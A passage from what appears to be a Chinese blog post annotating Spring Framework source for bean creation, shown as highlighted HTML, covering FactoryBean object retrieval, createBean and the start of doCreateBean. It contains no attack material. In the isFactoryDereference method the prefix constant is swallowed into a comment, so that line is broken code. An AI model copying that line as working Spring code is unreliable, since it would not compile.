class="language-java"><span class="token comment" spellcheck="true">/**     * Get the object for the given bean instance, either the bean     * instance itself or its created object in case of a FactoryBean.     * @param beanInstance the shared bean instance     * @param name name that may include factory dereference prefix     * @param beanName the canonical bean name     * @param mbd the merged bean definition     * @return the object to expose for the bean     */</span>    <span class="token keyword">protected</span> Object <span class="token function">getObjectForBeanInstance</span><span class="token punctuation">(</span>            Object beanInstance<span class="token punctuation">,</span> String name<span class="token punctuation">,</span> String beanName<span class="token punctuation">,</span> <span class="token annotation punctuation">@Nullable</span> RootBeanDefinition mbd<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// Don't let calling code try to dereference the factory if the bean isn't a factory.</span>        <span class="token comment" spellcheck="true">// 判断是否为工厂引用，判断是根据name是否为“&amp;”开头</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>BeanFactoryUtils<span class="token punctuation">.</span><span class="token function">isFactoryDereference</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>beanInstance <span class="token keyword">instanceof</span> <span class="token class-name">NullBean</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> beanInstance<span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token comment" spellcheck="true">// 外层的if是判断beanName是否为“&amp;”开头</span>            <span class="token comment" spellcheck="true">// 而当前这个if是判断是否实现了FactoryBean的接口，不然则抛出异常</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>beanInstance <span class="token keyword">instanceof</span> <span class="token class-name">FactoryBean</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">BeanIsNotAFactoryException</span><span class="token punctuation">(</span><span class="token function">transformedBeanName</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">,</span> beanInstance<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// Now we have the bean instance, which may be a normal bean or a FactoryBean.</span>        <span class="token comment" spellcheck="true">// If it's a FactoryBean, we use it to create a bean instance, unless the</span>        <span class="token comment" spellcheck="true">// caller actually wants a reference to the factory.</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>beanInstance <span class="token keyword">instanceof</span> <span class="token class-name">FactoryBean</span><span class="token punctuation">)</span> <span class="token operator">||</span> BeanFactoryUtils<span class="token punctuation">.</span><span class="token function">isFactoryDereference</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> beanInstance<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        Object object <span class="token operator">=</span> null<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>mbd <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// factoryBeanObjectCache专门为FactoryBean做实例化缓存</span>            object <span class="token operator">=</span> <span class="token function">getCachedObjectForFactoryBean</span><span class="token punctuation">(</span>beanName<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// </span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>object <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// Return bean instance from factory.</span>            FactoryBean<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> factory <span class="token operator">=</span> <span class="token punctuation">(</span>FactoryBean<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span><span class="token punctuation">)</span> beanInstance<span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// Caches object obtained from FactoryBean if it is a singleton.</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>mbd <span class="token operator">==</span> null <span class="token operator">&amp;&amp;</span> <span class="token function">containsBeanDefinition</span><span class="token punctuation">(</span>beanName<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                mbd <span class="token operator">=</span> <span class="token function">getMergedLocalBeanDefinition</span><span class="token punctuation">(</span>beanName<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">boolean</span> synthetic <span class="token operator">=</span> <span class="token punctuation">(</span>mbd <span class="token operator">!=</span> null <span class="token operator">&amp;&amp;</span> mbd<span class="token punctuation">.</span><span class="token function">isSynthetic</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 重点</span>            object <span class="token operator">=</span> <span class="token function">getObjectFromFactoryBean</span><span class="token punctuation">(</span>factory<span class="token punctuation">,</span> beanName<span class="token punctuation">,</span> <span class="token operator">!</span>synthetic<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> object<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token comment" spellcheck="true">/**     * Return whether the given name is a factory dereference     * (beginning with the factory dereference prefix).     * @param name the name of the bean     * @return whether the given name is a factory dereference     * @see BeanFactory#FACTORY_BEAN_PREFIX     */</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token function">isFactoryDereference</span><span class="token punctuation">(</span><span class="token annotation punctuation">@Nullable</span> String name<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// FACTORY_BEAN_PREFIX = "&amp;"</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>name <span class="token operator">!=</span> null <span class="token operator">&amp;&amp;</span> name<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span>BeanFactory<span class="token punctuation">.</span>                                               <span class="token comment" spellcheck="true">// FACTORY_BEAN_PREFIX = "&amp;"));</span>    <span class="token punctuation">}</span>   <span class="token comment" spellcheck="true">/**     * Obtain an object to expose from the given FactoryBean, if available     * in cached form. Quick check for minimal synchronization.     * @param beanName the name of the bean     * @return the object obtained from the FactoryBean,     * or {@code null} if not available     */</span>    <span class="token annotation punctuation">@Nullable</span>    <span class="token keyword">protected</span> Object <span class="token function">getCachedObjectForFactoryBean</span><span class="token punctuation">(</span>String beanName<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// factoryBeanObjectCache 是个map</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>factoryBeanObjectCache<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>beanName<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>如果是FactoryBean则获取对象，也就是调用FactoryBean的getObejct()</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">/**     * Obtain an object to expose from the given FactoryBean.     * @param factory the FactoryBean instance     * @param beanName the name of the bean     * @param shouldPostProcess whether the bean is subject to post-processing     * @return the object obtained from the FactoryBean     * @throws BeanCreationException if FactoryBean object creation failed     * @see org.springframework.beans.factory.FactoryBean#getObject()     */</span>    <span class="token keyword">protected</span> Object <span class="token function">getObjectFromFactoryBean</span><span class="token punctuation">(</span>FactoryBean<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> factory<span class="token punctuation">,</span> String beanName<span class="token punctuation">,</span> <span class="token keyword">boolean</span> shouldPostProcess<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>factory<span class="token punctuation">.</span><span class="token function">isSingleton</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">containsSingleton</span><span class="token punctuation">(</span>beanName<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">synchronized</span> <span class="token punctuation">(</span><span class="token function">getSingletonMutex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                Object object <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>factoryBeanObjectCache<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>beanName<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>object <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    object <span class="token operator">=</span> <span class="token function">doGetObjectFromFactoryBean</span><span class="token punctuation">(</span>factory<span class="token punctuation">,</span> beanName<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment" spellcheck="true">// Only post-process and store if not put there already during getObject() call above</span>                    <span class="token comment" spellcheck="true">// (e.g. because of circular reference processing triggered by custom getBean calls)</span>                    Object alreadyThere <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>factoryBeanObjectCache<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>beanName<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>alreadyThere <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                        object <span class="token operator">=</span> alreadyThere<span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    <span class="token keyword">else</span> <span class="token punctuation">{</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span>shouldPostProcess<span class="token punctuation">)</span> <span class="token punctuation">{</span>                            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isSingletonCurrentlyInCreation</span><span class="token punctuation">(</span>beanName<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                                <span class="token comment" spellcheck="true">// Temporarily return non-post-processed object, not storing it yet..</span>                                <span class="token keyword">return</span> object<span class="token punctuation">;</span>                            <span class="token punctuation">}</span>                            <span class="token function">beforeSingletonCreation</span><span class="token punctuation">(</span>beanName<span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token keyword">try</span> <span class="token punctuation">{</span>                                object <span class="token operator">=</span> <span class="token function">postProcessObjectFromFactoryBean</span><span class="token punctuation">(</span>object<span class="token punctuation">,</span> beanName<span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span>                            <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> ex<span class="token punctuation">)</span> <span class="token punctuation">{</span>                                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">BeanCreationException</span><span class="token punctuation">(</span>beanName<span class="token punctuation">,</span>                                        <span class="token string">"Post-processing of FactoryBean's singleton object failed"</span><span class="token punctuation">,</span> ex<span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span>                            <span class="token keyword">finally</span> <span class="token punctuation">{</span>                                <span class="token function">afterSingletonCreation</span><span class="token punctuation">(</span>beanName<span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span>                        <span class="token punctuation">}</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">containsSingleton</span><span class="token punctuation">(</span>beanName<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                            <span class="token keyword">this</span><span class="token punctuation">.</span>factoryBeanObjectCache<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>beanName<span class="token punctuation">,</span> object<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">}</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>                <span class="token keyword">return</span> object<span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// 核心方法</span>            Object object <span class="token operator">=</span> <span class="token function">doGetObjectFromFactoryBean</span><span class="token punctuation">(</span>factory<span class="token punctuation">,</span> beanName<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>shouldPostProcess<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">try</span> <span class="token punctuation">{</span>                    object <span class="token operator">=</span> <span class="token function">postProcessObjectFromFactoryBean</span><span class="token punctuation">(</span>object<span class="token punctuation">,</span> beanName<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> ex<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">BeanCreationException</span><span class="token punctuation">(</span>beanName<span class="token punctuation">,</span> <span class="token string">"Post-processing of FactoryBean's object failed"</span><span class="token punctuation">,</span> ex<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token keyword">return</span> object<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token comment" spellcheck="true">/**     * Obtain an object to expose from the given FactoryBean.     * @param factory the FactoryBean instance     * @param beanName the name of the bean     * @return the object obtained from the FactoryBean     * @throws BeanCreationException if FactoryBean object creation failed     * @see org.springframework.beans.factory.FactoryBean#getObject()     */</span>    <span class="token comment" spellcheck="true">// 入参的时候已经转为FactoryBean了，方法返回的是FactoryBean的实例</span>    <span class="token keyword">private</span> Object <span class="token function">doGetObjectFromFactoryBean</span><span class="token punctuation">(</span><span class="token keyword">final</span> FactoryBean<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> factory<span class="token punctuation">,</span> <span class="token keyword">final</span> String beanName<span class="token punctuation">)</span>            <span class="token keyword">throws</span> BeanCreationException <span class="token punctuation">{</span>        Object object<span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>System<span class="token punctuation">.</span><span class="token function">getSecurityManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                AccessControlContext acc <span class="token operator">=</span> <span class="token function">getAccessControlContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">try</span> <span class="token punctuation">{</span>                    object <span class="token operator">=</span> AccessController<span class="token punctuation">.</span><span class="token function">doPrivileged</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PrivilegedExceptionAction<span class="token operator">&lt;</span>Object<span class="token operator">></span><span class="token punctuation">)</span> factory<span class="token operator">:</span><span class="token operator">:</span>getObject<span class="token punctuation">,</span> acc<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">PrivilegedActionException</span> pae<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">throw</span> pae<span class="token punctuation">.</span><span class="token function">getException</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">// 获取对象</span>                object <span class="token operator">=</span> factory<span class="token punctuation">.</span><span class="token function">getObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">FactoryBeanNotInitializedException</span> ex<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">BeanCurrentlyInCreationException</span><span class="token punctuation">(</span>beanName<span class="token punctuation">,</span> ex<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> ex<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">BeanCreationException</span><span class="token punctuation">(</span>beanName<span class="token punctuation">,</span> <span class="token string">"FactoryBean threw exception on object creation"</span><span class="token punctuation">,</span> ex<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// Do not accept a null value for a FactoryBean that's not fully</span>        <span class="token comment" spellcheck="true">// initialized yet: Many FactoryBeans just return null then.</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>object <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isSingletonCurrentlyInCreation</span><span class="token punctuation">(</span>beanName<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">BeanCurrentlyInCreationException</span><span class="token punctuation">(</span>                        beanName<span class="token punctuation">,</span> <span class="token string">"FactoryBean which is currently in creation returned null from getObject"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            object <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">NullBean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> object<span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>创建Bean实例 AbstractAutowireCapableBeanFactory.createBean</p><p>注意：此处调用了后置处理器，然后在doCreateBean中开始创建对象和填充属性等</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">/**     * Create a bean instance for the given merged bean definition (and arguments).     * The bean definition will already have been merged with the parent definition     * in case of a child definition.     * &lt;p>All bean retrieval methods delegate to this method for actual bean creation.     * @param beanName the name of the bean     * @param mbd the merged bean definition for the bean     * @param args explicit arguments to use for constructor or factory method invocation     * @return a new instance of the bean     * @throws BeanCreationException if the bean could not be created     */</span>    <span class="token keyword">protected</span> <span class="token keyword">abstract</span> Object <span class="token function">createBean</span><span class="token punctuation">(</span>String beanName<span class="token punctuation">,</span> RootBeanDefinition mbd<span class="token punctuation">,</span> <span class="token annotation punctuation">@Nullable</span> Object<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span>            <span class="token keyword">throws</span> BeanCreationException<span class="token punctuation">;</span><span class="token comment" spellcheck="true">/**     * Central method of this class: creates a bean instance,     * populates the bean instance, applies post-processors, etc.     * @see #doCreateBean     */</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> Object <span class="token function">createBean</span><span class="token punctuation">(</span>String beanName<span class="token punctuation">,</span> RootBeanDefinition mbd<span class="token punctuation">,</span> <span class="token annotation punctuation">@Nullable</span> Object<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span>            <span class="token keyword">throws</span> BeanCreationException <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>logger<span class="token punctuation">.</span><span class="token function">isTraceEnabled</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            logger<span class="token punctuation">.</span><span class="token function">trace</span><span class="token punctuation">(</span><span class="token string">"Creating instance of bean '"</span> <span class="token operator">+</span> beanName <span class="token operator">+</span> <span class="token string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        RootBeanDefinition mbdToUse <span class="token operator">=</span> mbd<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// Make sure bean class is actually resolved at this point, and</span>        <span class="token comment" spellcheck="true">// clone the bean definition in case of a dynamically resolved Class</span>        <span class="token comment" spellcheck="true">// which cannot be stored in the shared merged bean definition.</span>        Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> resolvedClass <span class="token operator">=</span> <span class="token function">resolveBeanClass</span><span class="token punctuation">(</span>mbd<span class="token punctuation">,</span> beanName<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>resolvedClass <span class="token operator">!=</span> null <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>mbd<span class="token punctuation">.</span><span class="token function">hasBeanClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> mbd<span class="token punctuation">.</span><span class="token function">getBeanClassName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            mbdToUse <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RootBeanDefinition</span><span class="token punctuation">(</span>mbd<span class="token punctuation">)</span><span class="token punctuation">;</span>            mbdToUse<span class="token punctuation">.</span><span class="token function">setBeanClass</span><span class="token punctuation">(</span>resolvedClass<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// Prepare method overrides.</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            mbdToUse<span class="token punctuation">.</span><span class="token function">prepareMethodOverrides</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">BeanDefinitionValidationException</span> ex<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">BeanDefinitionStoreException</span><span class="token punctuation">(</span>mbdToUse<span class="token punctuation">.</span><span class="token function">getResourceDescription</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                    beanName<span class="token punctuation">,</span> <span class="token string">"Validation of method overrides failed"</span><span class="token punctuation">,</span> ex<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// Give BeanPostProcessors a chance to return a proxy instead of the target bean instance.</span>            <span class="token comment" spellcheck="true">// 调用后置处理器</span>            Object bean <span class="token operator">=</span> <span class="token function">resolveBeforeInstantiation</span><span class="token punctuation">(</span>beanName<span class="token punctuation">,</span> mbdToUse<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>bean <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> bean<span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> ex<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">BeanCreationException</span><span class="token punctuation">(</span>mbdToUse<span class="token punctuation">.</span><span class="token function">getResourceDescription</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> beanName<span class="token punctuation">,</span>                    <span class="token string">"BeanPostProcessor before instantiation of bean failed"</span><span class="token punctuation">,</span> ex<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// 真正开始创建对象</span>            Object beanInstance <span class="token operator">=</span> <span class="token function">doCreateBean</span><span class="token punctuation">(</span>beanName<span class="token punctuation">,</span> mbdToUse<span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>logger<span class="token punctuation">.</span><span class="token function">isTraceEnabled</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                logger<span class="token punctuation">.</span><span class="token function">trace</span><span class="token punctuation">(</span><span class="token string">"Finished creating instance of bean '"</span> <span class="token operator">+</span> beanName <span class="token operator">+</span> <span class="token string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">return</span> beanInstance<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">BeanCreationException</span> <span class="token operator">|</span> ImplicitlyAppearedSingletonException ex<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// A previously detected exception with proper bean creation context already,</span>            <span class="token comment" spellcheck="true">// or illegal singleton state to be communicated up to DefaultSingletonBeanRegistry.</span>            <span class="token keyword">throw</span> ex<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> ex<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">BeanCreationException</span><span class="token punctuation">(</span>                    mbdToUse<span class="token punctuation">.</span><span class="token function">getResourceDescription</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> beanName<span class="token punctuation">,</span> <span class="token string">"Unexpected exception during bean creation"</span><span class="token punctuation">,</span> ex<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><p>doCreateBean还解决循环依赖的问题，这里先不做说明，我们在下篇文章里细说</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">/**     * Actually create the specified bean. Pre-creation processing has already happened     * at this point, e.g. checking {@code postProcessBeforeInstantiation} callbacks.     * &lt;p>Differentiates between default bean instantiation, use of a     * factory method, and autowiring a constructor.     * @param beanName the name of the bean     * @param mbd the merged bean definition for the bean     * @param args explicit arguments to use for constructor or factory method invocation     * @return a new instance of the bean     * @throws BeanCreationException if the bean could not be created     * @see #instantiateBean     * @see #instantiateUsingFactoryMethod     * @see #autowireConstructor     */</span>    <span class="token keyword">protected</span> Object <span class="token function">doCreateBean</span><span class="token punctuation">(</span><span class="token keyword">final</span> String beanName<span class="token punctuation">,</span> <span class="token keyword">final</span> RootBeanDefinition mbd<span class="token punctuation">,</span> <span class="token keyword">final</span> <span class="token annotation punctuation">@Nullable</span> Object<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span>            <span class="token keyword">throws</span> BeanCreationException <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// Instantiate the bean.</span>        <span class="token comment" spellcheck="true">// 此处使用了装饰器模式</span>        BeanWrapper instanceWrapper <span class="token operator">=</span> null<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>mbd<span class="token punctuation">.</span><span class="token function">isSingleton</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// 从缓存中移除</span>            instanceWrapper <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>factoryBeanInstanceCache<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span>beanName<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>instanceWrapper <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// 创建BeanWrapper的实例</span>            instanceWrapper <span class="token operator">=</span> <span class="token function">createBeanInstance</span><span class="token punctuation">(</span>beanName<span class="token punctuation">,</span> mbd<span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">final</span> Object bean <span class="token operator">=</span> instanceWrapper<span class="token punctuation">.</span><span class="token function">getWrappedInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> beanType <span class="token operator">=</span> instanceWrapper<span class="token punctuation">.</span><span class="token function">getWrappedClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>beanType <span class="token operator">!=</span> NullBean<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            mbd<span class="token punctuation">.</span>resolvedTargetType <span class="token operator">=</span> beanType<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// Allow post-processors to modify the merged bean definition.</span>        <span class="token keyword">synchronized</span> <span class="token punctuation">(</span>mbd<span class="token punctuation">.</span>postProcessingLock<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>mbd<span class="token punctuation">.</span>postProcessed<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">try</span> <span class="token punctuation">{</span>                    <span class="token function">applyMergedBeanDefinitionPostProcessors</span><span class="token punctuation">(</span>mbd<span class="token punctuation">,</span> beanType<span class="token punctuation">,</span> beanName<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> ex<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">throw</span> <span class="token 